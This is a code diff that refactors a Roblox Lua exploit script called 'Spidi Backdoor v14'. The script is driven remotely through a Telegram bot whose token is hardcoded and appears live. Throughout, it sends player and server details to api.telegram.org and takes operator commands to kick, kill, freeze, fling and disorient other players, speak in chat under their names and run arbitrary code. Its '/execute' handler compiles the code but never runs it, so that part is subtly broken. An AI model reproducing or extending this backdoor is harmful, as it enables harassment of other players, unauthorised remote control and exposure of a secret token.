@@ -11,7 +11,7 @@ repeat wait() until game:IsLoaded()
 
 local BOT_TOKEN = "8778091630:AAEvqz_bo9fat2Or2Q_XYeeMWS2QBFPMRXc"
 local CHAT_ID = nil
-local LAST_PROCESSED_ID = 0
+local LAST_ID = 0
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
@@ -27,45 +27,27 @@ local RunService = game:GetService("RunService")
 local SoundService = game:GetService("SoundService")
 local TweenService = game:GetService("TweenService")
 
-local function httpRequest(url, method, headers, body)
+local function req(url, method, headers, body)
     local f = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
-    if not f then
-        return nil
-    end
-    local args = {
-        Url = url,
-        Method = method or "GET",
-        Headers = headers or {}
-    }
-    if body then
-        args.Body = body
-    end
-    local ok, res = pcall(f, args)
-    if ok and res then
-        return res
-    else
-        return nil
-    end
+    if not f then return nil end
+    local a = {Url = url, Method = method or "GET", Headers = headers or {}}
+    if body then a.Body = body end
+    local ok, r = pcall(f, a)
+    if ok and r then return r else return nil end
 end
 
-local function sendMessage(text)
-    if not CHAT_ID then
-        return
-    end
-    local payload = {
-        chat_id = CHAT_ID,
-        text = text,
-        parse_mode = "HTML"
-    }
-    httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage", "POST", {["Content-Type"] = "application/json"}, HttpService:JSONEncode(payload))
+local function send(text)
+    if not CHAT_ID then return end
+    local p = {chat_id = CHAT_ID, text = text, parse_mode = "HTML"}
+    req("https://api.telegram.org/bot"..BOT_TOKEN.."/sendMessage", "POST", {["Content-Type"] = "application/json"}, HttpService:JSONEncode(p))
 end
 
-local function getChatId()
-    local res = httpRequest("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates", "GET", {})
-    if res and res.Body then
-        local ok, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
-        if ok and data and data.result and #data.result > 0 then
-            CHAT_ID = data.result[#data.result].message.chat.id
+local function getChat()
+    local r = req("https://api.telegram.org/bot"..BOT_TOKEN.."/getUpdates")
+    if r and r.Body then
+        local ok, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
+        if ok and d and d.result and #d.result > 0 then
+            CHAT_ID = d.result[#d.result].message.chat.id
             return true
         end
     end
@@ -74,59 +56,45 @@ end
 
 local scriptUsers = {}
 local myPlayer = Players.LocalPlayer
-local activeProcesses = {}
+local active = {}
 
-local function addScriptUser(player)
-    if not scriptUsers[player.UserId] then
-        scriptUsers[player.UserId] = player
-        sendMessage("🟢 <b>"..player.Name.."</b> подключился к Spidi Backdoor!")
+local function addUser(p)
+    if not scriptUsers[p.UserId] then
+        scriptUsers[p.UserId] = p
+        send("🟢 <b>"..p.Name.."</b> подключился!")
     end
 end
 
-addScriptUser(myPlayer)
+addUser(myPlayer)
 
-local marker = Instance.new("BoolValue")
-marker.Name = "SpidiUser"
-marker.Parent = myPlayer
+local m = Instance.new("BoolValue")
+m.Name = "SpidiUser"
+m.Parent = myPlayer
 
-local function findPlayer(input)
-    if not input or input == "" then
-        return nil, "❌ Введи ник или номер"
-    end
-    
+local function findPlayer(inp)
+    if not inp or inp == "" then return nil, "❌ Введи ник" end
     local users = {}
     for _, p in pairs(Players:GetPlayers()) do
-        if scriptUsers[p.UserId] then
-            table.insert(users, p)
-        end
+        if scriptUsers[p.UserId] then table.insert(users, p) end
     end
-    
-    local num = tonumber(input)
-    if num and users[num] then
-        return users[num]
-    end
-    
-    input = input:lower()
+    local num = tonumber(inp)
+    if num and users[num] then return users[num] end
+    inp = inp:lower()
     local matches = {}
     for _, p in pairs(users) do
-        if p.Name:lower():find(input, 1, true) or p.DisplayName:lower():find(input, 1, true) then
+        if p.Name:lower():find(inp, 1, true) or p.DisplayName:lower():find(inp, 1, true) then
             table.insert(matches, p)
         end
     end
-    if #matches == 1 then
-        return matches[1]
+    if #matches == 1 then return matches[1]
     elseif #matches > 1 then
         local names = {}
-        for _, p in pairs(matches) do
-            table.insert(names, p.Name)
-        end
+        for _, p in pairs(matches) do table.insert(names, p.Name) end
         return nil, "Найдено несколько: "..table.concat(names, ", ")
-    else
-        return nil, "Игрок не найден"
-    end
+    else return nil, "Игрок не найден" end
 end
 
-local function getScriptUserList()
+local function getUsers()
     local list = {}
     local i = 1
     for _, p in pairs(Players:GetPlayers()) do
@@ -138,34 +106,27 @@ local function getScriptUserList()
     return list
 end
 
-local function getAllPlayers()
+local function getAll()
     local list = {}
     local i = 1
     for _, p in pairs(Players:GetPlayers()) do
-        local hasScript = scriptUsers[p.UserId] and " 🔥" or ""
-        table.insert(list, i..". "..p.Name..hasScript)
+        local hs = scriptUsers[p.UserId] and " 🔥" or ""
+        table.insert(list, i..". "..p.Name..hs)
         i = i + 1
     end
     return list
 end
 
-local function stopAllProcesses()
-    for userId, data in pairs(activeProcesses) do
-        if data.connection then
-            pcall(data.connection.Disconnect, data.connection)
-        end
-        if data.running then
-            data.running = false
-        end
+local function stopAll()
+    for _, d in pairs(active) do
+        if d.conn then pcall(d.conn.Disconnect, d.conn) end
+        if d.run then d.run = false end
     end
-    activeProcesses = {}
-    
+    active = {}
     for _, p in pairs(Players:GetPlayers()) do
         if p.Character then
             local hrp = p.Character:FindFirstChild("HumanoidRootPart")
-            if hrp then
-                hrp.CFrame = CFrame.new(hrp.Position)
-            end
+            if hrp then hrp.CFrame = CFrame.new(hrp.Position) end
             local hum = p.Character:FindFirstChild("Humanoid")
             if hum then
                 hum.WalkSpeed = 16
@@ -173,206 +134,160 @@ local function stopAllProcesses()
             end
         end
     end
-    
-    local blur = Lighting:FindFirstChild("SpidiWarp")
-    if blur then
-        blur:Destroy()
-    end
-    
-    sendMessage("🛑 <b>Все процессы остановлены!</b>")
+    local b = Lighting:FindFirstChild("SpidiWarp")
+    if b then b:Destroy() end
+    send("🛑 <b>Все процессы остановлены!</b>")
 end
 
-local function playMusic(soundId)
-    local oldSound = SoundService:FindFirstChild("ClientMusic")
-    if oldSound then
-        oldSound:Destroy()
-    end
-    local sound = Instance.new("Sound")
-    sound.Name = "ClientMusic"
-    sound.SoundId = "rbxassetid://" .. tostring(soundId)
-    sound.Volume = 1
-    sound.Looped = true
-    sound.Parent = SoundService
-    sound:Play()
+local function playMusic(id)
+    local old = SoundService:FindFirstChild("ClientMusic")
+    if old then old:Destroy() end
+    local s = Instance.new("Sound")
+    s.Name = "ClientMusic"
+    s.SoundId = "rbxassetid://"..tostring(id)
+    s.Volume = 1
+    s.Looped = true
+    s.Parent = SoundService
+    s:Play()
 end
 
 local function stopMusic()
-    local sound = SoundService:FindFirstChild("ClientMusic")
-    if sound then
-        sound:Stop()
-        sound:Destroy()
+    local s = SoundService:FindFirstChild("ClientMusic")
+    if s then
+        s:Stop()
+        s:Destroy()
         return true
     end
     return false
 end
 
-local messageCooldown = {}
-local function canSendMessage(player)
-    local userId = player.UserId
-    local last = messageCooldown[userId] or 0
-    if tick() - last < 0.3 then
-        return false
-    end
-    messageCooldown[userId] = tick()
+local cd = {}
+local function canSend(p)
+    local id = p.UserId
+    local last = cd[id] or 0
+    if tick() - last < 0.3 then return false end
+    cd[id] = tick()
     return true
 end
 
-local function desorientPlayer(target)
-    local char = target.Character
-    if not char then
-        return
-    end
-    local camera = Workspace.CurrentCamera
-    if not camera then
-        return
-    end
-    camera.CameraType = Enum.CameraType.Scriptable
-    local startTime = tick()
-    local connection
-    connection = RunService.RenderStepped:Connect(function()
-        if tick() - startTime >= 3 then
-            connection:Disconnect()
-            camera.CameraType = Enum.CameraType.Custom
+local function desorient(p)
+    local char = p.Character
+    if not char then return end
+    local cam = Workspace.CurrentCamera
+    if not cam then return end
+    cam.CameraType = Enum.CameraType.Scriptable
+    local st = tick()
+    local conn
+    conn = RunService.RenderStepped:Connect(function()
+        if tick() - st >= 3 then
+            conn:Disconnect()
+            cam.CameraType = Enum.CameraType.Custom
             return
         end
-        camera.CFrame = camera.CFrame * CFrame.Angles(
-            math.rad(math.random(-15, 15)),
-            math.rad(25),
-            math.rad(math.random(-10, 10))
-        )
+        cam.CFrame = cam.CFrame * CFrame.Angles(math.rad(math.random(-15,15)), math.rad(25), math.rad(math.random(-10,10)))
     end)
-    activeProcesses[target.UserId] = {connection = connection}
+    active[p.UserId] = {conn = conn}
 end
 
-local isFpsCapped = false
+local fpsCapped = false
 local function toggleFps()
-    isFpsCapped = not isFpsCapped
-    setfpscap(isFpsCapped and 10 or 60)
-    return isFpsCapped
+    fpsCapped = not fpsCapped
+    setfpscap(fpsCapped and 10 or 60)
+    return fpsCapped
 end
 
-local function sayMessage(target, msg)
-    if not target then
+local function say(p, msg)
+    if not p then return end
+    local ch = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+    if ch then
+        ch:SendAsync(msg)
         return
     end
-    local chatChannel = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
-    if chatChannel then
-        chatChannel:SendAsync(msg)
-        return
-    end
-    local legacyRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
-    if legacyRemote then
-        local say = legacyRemote:FindFirstChild("SayMessageRequest")
-        if say then
-            say:FireServer(msg, "All")
-        end
+    local legacy = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+    if legacy then
+        local sayRemote = legacy:FindFirstChild("SayMessageRequest")
+        if sayRemote then sayRemote:FireServer(msg, "All") end
     end
 end
 
-local stunnedPlayers = {}
-local function stunPlayer(target)
-    local char = target.Character
-    if not char then
-        return
-    end
+local stunned = {}
+local function stun(p)
+    local char = p.Character
+    if not char then return end
     local hum = char:FindFirstChild("Humanoid")
-    if not hum then
-        return
-    end
-    local origSpeed = hum.WalkSpeed
-    local origJump = hum.JumpPower
+    if not hum then return end
+    local os = hum.WalkSpeed
+    local oj = hum.JumpPower
     hum.WalkSpeed = 0
     hum.JumpPower = 0
-    stunnedPlayers[target.UserId] = {speed = origSpeed, jump = origJump}
+    stunned[p.UserId] = {speed = os, jump = oj}
     task.delay(3, function()
-        if stunnedPlayers[target.UserId] then
-            local data = stunnedPlayers[target.UserId]
-            local h = target.Character and target.Character:FindFirstChild("Humanoid")
+        if stunned[p.UserId] then
+            local d = stunned[p.UserId]
+            local h = p.Character and p.Character:FindFirstChild("Humanoid")
             if h then
-                h.WalkSpeed = data.speed
-                h.JumpPower = data.jump
+                h.WalkSpeed = d.speed
+                h.JumpPower = d.jump
             end
-            stunnedPlayers[target.UserId] = nil
+            stunned[p.UserId] = nil
         end
     end)
 end
 
-local function flingPlayer(target)
-    local char = target.Character
-    if not char then
-        return
-    end
+local function fling(p)
+    local char = p.Character
+    if not char then return end
     local hrp = char:FindFirstChild("HumanoidRootPart")
     local hum = char:FindFirstChildOfClass("Humanoid")
-    if not (hrp and hum) then
-        return
-    end
+    if not (hrp and hum) then return end
     hum.Sit = true
-    local dirX = math.random() > 0.5 and 1 or -1
-    local dirZ = math.random() > 0.5 and 1 or -1
-    hrp.AssemblyLinearVelocity = Vector3.new(
-        math.random(200, 400) * dirX,
-        math.random(300, 500),
-        math.random(200, 400) * dirZ
-    )
+    local dx = math.random() > 0.5 and 1 or -1
+    local dz = math.random() > 0.5 and 1 or -1
+    hrp.AssemblyLinearVelocity = Vector3.new(math.random(200,400)*dx, math.random(300,500), math.random(200,400)*dz)
 end
 
-local spinningPlayers = {}
-local function spinPlayer(target, speed)
+local spinning = {}
+local function spin(p, speed)
     speed = speed or 1
     speed = math.clamp(speed, 0.5, 10)
-    if spinningPlayers[target.UserId] then
-        spinningPlayers[target.UserId] = nil
-    end
-    local char = target.Character
-    if not char then
-        return false
-    end
+    if spinning[p.UserId] then spinning[p.UserId] = nil end
+    local char = p.Character
+    if not char then return false end
     local hrp = char:FindFirstChild("HumanoidRootPart")
-    if not hrp then
-        return false
-    end
-    local running = true
-    spinningPlayers[target.UserId] = {running = true}
-    activeProcesses[target.UserId] = {running = running}
+    if not hrp then return false end
+    local run = true
+    spinning[p.UserId] = {run = run}
+    active[p.UserId] = {run = run}
     spawn(function()
-        while running and spinningPlayers[target.UserId] and spinningPlayers[target.UserId].running do
-            if not target.Character then
-                break
-            end
-            local h = target.Character:FindFirstChild("HumanoidRootPart")
-            if h then
-                h.CFrame = h.CFrame * CFrame.Angles(0, math.rad(18 * speed), 0)
-            end
+        while run and spinning[p.UserId] and spinning[p.UserId].run do
+            if not p.Character then break end
+            local h = p.Character:FindFirstChild("HumanoidRootPart")
+            if h then h.CFrame = h.CFrame * CFrame.Angles(0, math.rad(18*speed), 0) end
             task.wait(0.05)
         end
     end)
     return true
 end
 
-local function unspinPlayer(target)
-    if spinningPlayers[target.UserId] then
-        spinningPlayers[target.UserId].running = false
-        spinningPlayers[target.UserId] = nil
-        activeProcesses[target.UserId] = nil
-        local char = target.Character
+local function unspin(p)
+    if spinning[p.UserId] then
+        spinning[p.UserId].run = false
+        spinning[p.UserId] = nil
+        active[p.UserId] = nil
+        local char = p.Character
         if char then
             local hrp = char:FindFirstChild("HumanoidRootPart")
-            if hrp then
-                hrp.CFrame = CFrame.new(hrp.Position)
-            end
+            if hrp then hrp.CFrame = CFrame.new(hrp.Position) end
         end
         return true
     end
     return false
 end
 
-local function showNotification(target, text, duration)
-    duration = duration or 5
-    local gui = target:FindFirstChild("PlayerGui")
-    if not gui then
-        return
-    end
+local function notify(p, text, dur)
+    dur = dur or 5
+    local gui = p:FindFirstChild("PlayerGui")
+    if not gui then return end
     local screen = Instance.new("ScreenGui")
     screen.Name = "SpidiNotif"
     screen.ResetOnSpawn = false
@@ -380,7 +295,7 @@ local function showNotification(target, text, duration)
     local frame = Instance.new("Frame")
     frame.Size = UDim2.new(0, 450, 0, 50)
     frame.Position = UDim2.new(0.5, -225, 0, 20)
-    frame.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
+    frame.BackgroundColor3 = Color3.fromRGB(10,10,20)
     frame.BackgroundTransparency = 0.1
     frame.BorderSizePixel = 0
     frame.Parent = screen
@@ -388,206 +303,118 @@ local function showNotification(target, text, duration)
     corner.CornerRadius = UDim.new(0, 10)
     corner.Parent = frame
     local stroke = Instance.new("UIStroke")
-    stroke.Color = Color3.fromRGB(0, 255, 0)
+    stroke.Color = Color3.fromRGB(0,255,0)
     stroke.Thickness = 1
     stroke.Parent = frame
-    local textLabel = Instance.new("TextLabel")
-    textLabel.Size = UDim2.new(1, -20, 1, 0)
-    textLabel.Position = UDim2.new(0, 10, 0, 0)
-    textLabel.BackgroundTransparency = 1
-    textLabel.Text = text or ""
-    textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    textLabel.TextSize = 16
-    textLabel.Font = Enum.Font.Gotham
-    textLabel.TextXAlignment = Enum.TextXAlignment.Center
-    textLabel.TextWrapped = true
-    textLabel.Parent = frame
+    local label = Instance.new("TextLabel")
+    label.Size = UDim2.new(1, -20, 1, 0)
+    label.Position = UDim2.new(0, 10, 0, 0)
+    label.BackgroundTransparency = 1
+    label.Text = text or ""
+    label.TextColor3 = Color3.fromRGB(255,255,255)
+    label.TextSize = 16
+    label.Font = Enum.Font.Gotham
+    label.TextXAlignment = Enum.TextXAlignment.Center
+    label.TextWrapped = true
+    label.Parent = frame
     frame.BackgroundTransparency = 1
     frame.Position = UDim2.new(0.5, -225, 0, -80)
     TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
         BackgroundTransparency = 0.1,
         Position = UDim2.new(0.5, -225, 0, 20)
     }):Play()
-    game:GetService("Debris"):AddItem(screen, duration)
+    game:GetService("Debris"):AddItem(screen, dur)
 end
 
-local function handleCommand(cmd, args)
+local function handle(cmd, args)
     local info = "👤 Hacker228\n🔗 https://www.roblox.com/games/"..game.PlaceId
     
     if cmd == "start" then
-        sendMessage("✅ Spidi Backdoor ULTIMATE v14 активирован!\n"..info)
+        send("✅ Spidi v14 активирован!\n"..info)
         return
     end
     
     if cmd == "rm" then
-        stopAllProcesses()
+        stopAll()
         return
     end
     
     if cmd == "help" then
-        sendMessage("📋 <b>КОМАНДЫ SPIDI v14:</b>\n\n"..
-            "<b>👤 ПОЛЬЗОВАТЕЛИ:</b>\n"..
-            "/players - список пользователей скрипта\n"..
-            "/pc - все игроки на сервере\n"..
-            "/rm - остановить все процессы\n"..
-            "/kick [ник] [причина] - кикнуть\n"..
-            "/ban [ник] [причина] - забанить\n"..
-            "/unban [ник] - разбанить\n"..
-            "/kill [ник] - убить\n"..
-            "/freeze [ник] - заморозить\n"..
-            "/unfreeze [ник] - разморозить\n"..
-            "/fly [ник] - полететь\n"..
-            "/unfly [ник] - отключить полет\n"..
-            "/crash [ник] - крашнуть\n"..
-            "/fling [ник] - флинг\n"..
-            "/teleport [ник1] [ник2] - телепорт\n"..
-            "/bring [ник1] [ник2] - притянуть\n"..
-            "/loopkill [ник] - бесконечный килл\n"..
-            "/stun [ник] - оглушить (3 сек)\n"..
-            "/jump [ник] - прыжок\n"..
-            "/spin [ник] [скорость] - крутить\n"..
-            "/unspin [ник] - остановить вращение\n"..
-            "/explode [ник] - взорвать\n"..
-            "/des [ник] - дезориентация (3 сек)\n"..
-            "/warp [ник] [1-10] - размыть экран\n"..
-            "/unwarp [ник] - убрать размытие\n\n"..
-            "<b>🎵 МУЗЫКА:</b>\n"..
-            "/music [айди] - играть музыку\n"..
-            "/unmusic - выключить музыку\n\n"..
-            "<b>💬 ЧАТ:</b>\n"..
-            "/say [ник] [текст] - сказать от имени\n"..
-            "/spam [ник] [кол-во] [текст] - спам\n"..
-            "/message [ник] [текст] - сообщение\n"..
-            "/announce [текст] - объявление\n\n"..
-            "<b>📊 ИНФО:</b>\n"..
-            "/players - список пользователей скрипта\n"..
-            "/pc - все игроки на сервере\n"..
-            "/server - инфо о сервере\n"..
-            "/rejoin - перезайти\n"..
-            "/execute [код] - выполнить код\n"..
-            "/setfps - ограничить FPS\n"..
-            "/help - помощь")
+        send("📋 <b>КОМАНДЫ:</b>\n/players - пользователи\n/pc - все игроки\n/rm - стоп процессы\n/kick [ник] [причина]\n/ban [ник] [причина]\n/unban [ник]\n/kill [ник]\n/freeze [ник]\n/unfreeze [ник]\n/fly [ник]\n/unfly [ник]\n/crash [ник]\n/fling [ник]\n/teleport [ник1] [ник2]\n/bring [ник1] [ник2]\n/loopkill [ник]\n/stun [ник]\n/jump [ник]\n/spin [ник] [скорость]\n/unspin [ник]\n/explode [ник]\n/des [ник]\n/warp [ник] [1-10]\n/unwarp [ник]\n/music [айди]\n/unmusic\n/say [ник] [текст]\n/spam [ник] [кол-во] [текст]\n/message [ник] [текст]\n/announce [текст]\n/players\n/pc\n/server\n/rejoin\n/execute [код]\n/setfps\n/help")
         return
     end
     
     if cmd == "players" then
-        local list = getScriptUserList()
-        if #list == 0 then
-            sendMessage("👥 Пользователей скрипта: 0")
-        else
-            sendMessage("👥 <b>Пользователи Spidi:</b>\n"..table.concat(list, "\n"))
-        end
+        local list = getUsers()
+        if #list == 0 then send("👥 Пользователей: 0") else send("👥 <b>Пользователи:</b>\n"..table.concat(list, "\n")) end
         return
     end
     
     if cmd == "pc" then
-        local list = getAllPlayers()
-        if #list == 0 then
-            sendMessage("👥 Игроков на сервере: 0")
-        else
-            sendMessage("👥 <b>Все игроки на сервере:</b>\n"..table.concat(list, "\n").."\n\n🔥 - использует Spidi Backdoor")
-        end
+        local list = getAll()
+        if #list == 0 then send("👥 Игроков: 0") else send("👥 <b>Все игроки:</b>\n"..table.concat(list, "\n").."\n\n🔥 - Spidi") end
         return
     end
     
     if cmd == "server" then
-        local placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-        local scriptCount = 0
-        for _, p in pairs(Players:GetPlayers()) do
-            if scriptUsers[p.UserId] then
-                scriptCount = scriptCount + 1
-            end
-        end
-        sendMessage("🖥️ Сервер: "..placeName.."\nID: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers().."\nПользователей Spidi: "..scriptCount)
+        local name = MarketplaceService:GetProductInfo(game.PlaceId).Name
+        local count = 0
+        for _, p in pairs(Players:GetPlayers()) do if scriptUsers[p.UserId] then count = count + 1 end end
+        send("🖥️ Сервер: "..name.."\nID: "..game.PlaceId.."\nИгроков: "..#Players:GetPlayers().."\nSpidi: "..count)
         return
     end
     
     if cmd == "rejoin" then
-        sendMessage("🔄 Перезаход...")
+        send("🔄 Перезаход...")
         TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
         return
     end
     
     if cmd == "setfps" then
         local state = toggleFps()
-        if state then
-            sendMessage("🎮 FPS лимит: 10 (включён)")
-        else
-            sendMessage("🎮 FPS лимит: 60 (выключен)")
-        end
+        send("🎮 FPS: "..(state and "10" or "60"))
         return
     end
     
     if cmd == "execute" then
         local code = table.concat(args, " ", 1)
-        if code == "" then
-            sendMessage("❌ /execute код")
-            return
-        end
-        sendMessage("⏳ Выполнение...")
+        if code == "" then send("❌ /execute код") return end
+        send("⏳ Выполнение...")
         local ok, res = pcall(loadstring, code)
-        if ok then
-            sendMessage("✅ Код выполнен\n"..info)
-        else
-            sendMessage("❌ Ошибка: "..tostring(res))
-        end
+        if ok then send("✅ Код выполнен\n"..info) else send("❌ Ошибка: "..tostring(res)) end
         return
     end
     
     if cmd == "music" then
         local id = args[1]
-        if not id then
-            sendMessage("❌ /music [айди]")
-            return
-        end
+        if not id then send("❌ /music [айди]") return end
         playMusic(id)
-        sendMessage("🎵 Музыка включена! ID: "..id)
+        send("🎵 Музыка включена! ID: "..id)
         return
     end
     
     if cmd == "unmusic" then
-        if stopMusic() then
-            sendMessage("🔇 Музыка выключена!")
-        else
-            sendMessage("❌ Музыка не играет")
-        end
+        if stopMusic() then send("🔇 Музыка выключена!") else send("❌ Музыка не играет") end
         return
     end
     
     if cmd == "announce" then
         local msg = table.concat(args, " ", 1)
-        if msg == "" then
-            sendMessage("❌ /announce [текст]")
-            return
-        end
-        StarterGui:SetCore("SendNotification", {
-            Title = "",
-            Text = msg,
-            Duration = 10,
-            Icon = ""
-        })
-        sendMessage("✅ Объявление: "..msg)
+        if msg == "" then send("❌ /announce [текст]") return end
+        StarterGui:SetCore("SendNotification", {Title = "", Text = msg, Duration = 10, Icon = ""})
+        send("✅ Объявление: "..msg)
         return
     end
     
     if cmd == "say" then
         local name = args[1]
         local msg = table.concat(args, " ", 2)
-        if not name then
-            sendMessage("❌ /say [ник/номер] [текст]")
-            return
-        end
-        if msg == "" then
-            sendMessage("❌ Введи текст: /say ник текст")
-            return
-        end
+        if not name then send("❌ /say [ник] [текст]") return end
+        if msg == "" then send("❌ Введи текст") return end
         local target, err = findPlayer(name)
-        if not target then
-            sendMessage("❌ "..err)
-            return
-        end
-        sayMessage(target, msg)
-        sendMessage("✅ Сказано от имени <b>"..target.Name.."</b>: "..msg)
+        if not target then send("❌ "..err) return end
+        say(target, msg)
+        send("✅ Сказано от <b>"..target.Name.."</b>: "..msg)
         return
     end
     
@@ -595,195 +422,123 @@ local function handleCommand(cmd, args)
         local name = args[1]
         local count = tonumber(args[2]) or 5
         local msg = table.concat(args, " ", 3)
-        if not name then
-            sendMessage("❌ /spam [ник/номер] [кол-во] [текст]")
-            return
-        end
-        if msg == "" then
-            sendMessage("❌ Введи текст: /spam ник кол-во текст")
-            return
-        end
+        if not name then send("❌ /spam [ник] [кол-во] [текст]") return end
+        if msg == "" then send("❌ Введи текст") return end
         local target, err = findPlayer(name)
-        if not target then
-            sendMessage("❌ "..err)
-            return
-        end
+        if not target then send("❌ "..err) return end
         for i = 1, math.min(count, 20) do
             task.wait(0.1)
-            sayMessage(target, msg.." "..i)
+            say(target, msg.." "..i)
         end
-        sendMessage("✅ Спам отправлен от имени <b>"..target.Name.."</b> ("..math.min(count, 20).." раз)")
+        send("✅ Спам от <b>"..target.Name.."</b> ("..math.min(count,20).." раз)")
         return
     end
     
     if cmd == "message" then
         local name = args[1]
         local msg = table.concat(args, " ", 2)
-        if not name then
-            sendMessage("❌ /message [ник/номер] [текст]")
-            return
-        end
-        if msg == "" then
-            sendMessage("❌ Введи текст: /message ник текст")
-            return
-        end
+        if not name then send("❌ /message [ник] [текст]") return end
+        if msg == "" then send("❌ Введи текст") return end
         local target, err = findPlayer(name)
-        if not target then
-            sendMessage("❌ "..err)
-            return
-        end
-        if not canSendMessage(target) then
-            sendMessage("⏳ Подожди 0.3 сек перед следующим сообщением")
-            return
-        end
-        showNotification(target, msg, 5)
-        sendMessage("✅ Сообщение <b>"..target.Name.."</b>: "..msg)
+        if not target then send("❌ "..err) return end
+        if not canSend(target) then send("⏳ Подожди 0.3 сек") return end
+        notify(target, msg, 5)
+        send("✅ Сообщение <b>"..target.Name.."</b>: "..msg)
         return
     end
     
     if cmd == "teleport" or cmd == "bring" then
-        local name1 = args[1]
-        local name2 = args[2]
-        if not name1 or not name2 then
-            sendMessage("❌ /"..cmd.." [ник1/номер1] [ник2/номер2]")
-            return
-        end
-        local target1, err1 = findPlayer(name1)
-        if not target1 then
-            sendMessage("❌ "..err1)
-            return
-        end
-        local target2, err2 = findPlayer(name2)
-        if not target2 then
-            sendMessage("❌ "..err2)
-            return
-        end
-        local hrp1 = target1.Character and target1.Character:FindFirstChild("HumanoidRootPart")
-        local hrp2 = target2.Character and target2.Character:FindFirstChild("HumanoidRootPart")
-        if not hrp1 or not hrp2 then
-            sendMessage("❌ Не найден персонаж у одного из игроков")
-            return
-        end
+        local n1 = args[1]
+        local n2 = args[2]
+        if not n1 or not n2 then send("❌ /"..cmd.." [ник1] [ник2]") return end
+        local t1, e1 = findPlayer(n1)
+        if not t1 then send("❌ "..e1) return end
+        local t2, e2 = findPlayer(n2)
+        if not t2 then send("❌ "..e2) return end
+        local h1 = t1.Character and t1.Character:FindFirstChild("HumanoidRootPart")
+        local h2 = t2.Character and t2.Character:FindFirstChild("HumanoidRootPart")
+        if not h1 or not h2 then send("❌ Нет персонажа") return end
         if cmd == "teleport" then
-            hrp1.CFrame = hrp2.CFrame + Vector3.new(0, 3, 0)
-            sendMessage("📍 <b>"..target1.Name.."</b> телепортирован к <b>"..target2.Name.."</b>")
+            h1.CFrame = h2.CFrame + Vector3.new(0,3,0)
+            send("📍 <b>"..t1.Name.."</b> к <b>"..t2.Name.."</b>")
         else
-            hrp2.CFrame = hrp1.CFrame + Vector3.new(0, 3, 0)
-            sendMessage("📍 <b>"..target2.Name.."</b> притянут к <b>"..target1.Name.."</b>")
+            h2.CFrame = h1.CFrame + Vector3.new(0,3,0)
+            send("📍 <b>"..t2.Name.."</b> к <b>"..t1.Name.."</b>")
         end
         return
     end
     
     local name = args[1]
-    if not name then
-        sendMessage("❌ Укажи ник или номер игрока")
-        return
-    end
-    
+    if not name then send("❌ Укажи ник") return end
     local target, err = findPlayer(name)
-    if not target then
-        sendMessage("❌ "..err)
-        return
-    end
+    if not target then send("❌ "..err) return end
     
     if target == myPlayer then
         if cmd == "kick" or cmd == "ban" then
-            sendMessage("❌ Нельзя кикнуть/забанить самого себя!")
+            send("❌ Нельзя кикнуть/забанить себя!")
             return
         end
     end
     
     local char = target.Character
     local hrp = char and char:FindFirstChild("HumanoidRootPart")
-    local humanoid = char and char:FindFirstChild("Humanoid")
+    local hum = char and char:FindFirstChild("Humanoid")
     
     if cmd == "kick" then
         local reason = table.concat(args, " ", 2)
-        if reason == "" or reason == name then
-            target:Kick("Kicked by Spidi Backdoor")
-        else
-            target:Kick(reason)
-        end
-        if reason ~= "" and reason ~= name then
-            sendMessage("✅ Кикнут: <b>"..target.Name.."</b> (Причина: "..reason..")")
-        else
-            sendMessage("✅ Кикнут: <b>"..target.Name.."</b>")
-        end
+        if reason == "" or reason == name then target:Kick("Kicked by Spidi") else target:Kick(reason) end
+        send("✅ Кикнут: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (Причина: "..reason..")" or ""))
         return
     end
     
     if cmd == "ban" then
         local reason = table.concat(args, " ", 2)
-        if reason == "" or reason == name then
-            target:Kick("Banned by Spidi Backdoor")
-        else
-            target:Kick(reason)
-        end
-        if reason ~= "" and reason ~= name then
-            sendMessage("✅ Забанен: <b>"..target.Name.."</b> (Причина: "..reason..")")
-        else
-            sendMessage("✅ Забанен: <b>"..target.Name.."</b>")
-        end
+        if reason == "" or reason == name then target:Kick("Banned by Spidi") else target:Kick(reason) end
+        send("✅ Забанен: <b>"..target.Name.."</b>"..(reason ~= "" and reason ~= name and " (Причина: "..reason..")" or ""))
         return
     end
     
     if cmd == "unban" then
-        target:Kick("Unbanned by Spidi Backdoor")
-        sendMessage("✅ Разбанен: <b>"..target.Name.."</b>")
+        target:Kick("Unbanned by Spidi")
+        send("✅ Разбанен: <b>"..target.Name.."</b>")
         return
     end
     
-    if cmd == "kill" then
-        if humanoid then
-            humanoid.Health = 0
-            sendMessage("💀 Убит: <b>"..target.Name.."</b>")
-        else
-            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
-        end
+    if cmd == "kill" and hum then
+        hum.Health = 0
+        send("💀 Убит: <b>"..target.Name.."</b>")
         return
     end
     
-    if cmd == "freeze" then
-        if hrp and humanoid then
-            hrp.Anchored = true
-            humanoid.WalkSpeed = 0
-            humanoid.JumpPower = 0
-            sendMessage("🧊 Заморожен: <b>"..target.Name.."</b>")
-        else
-            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
-        end
+    if cmd == "freeze" and hrp and hum then
+        hrp.Anchored = true
+        hum.WalkSpeed = 0
+        hum.JumpPower = 0
+        send("🧊 Заморожен: <b>"..target.Name.."</b>")
         return
     end
     
-    if cmd == "unfreeze" then
-        if hrp and humanoid then
-            hrp.Anchored = false
-            humanoid.WalkSpeed = 16
-            humanoid.JumpPower = 50
-            sendMessage("🔥 Разморожен: <b>"..target.Name.."</b>")
-        else
-            sendMessage("❌ Не найден персонаж у <b>"..target.Name.."</b>")
-        end
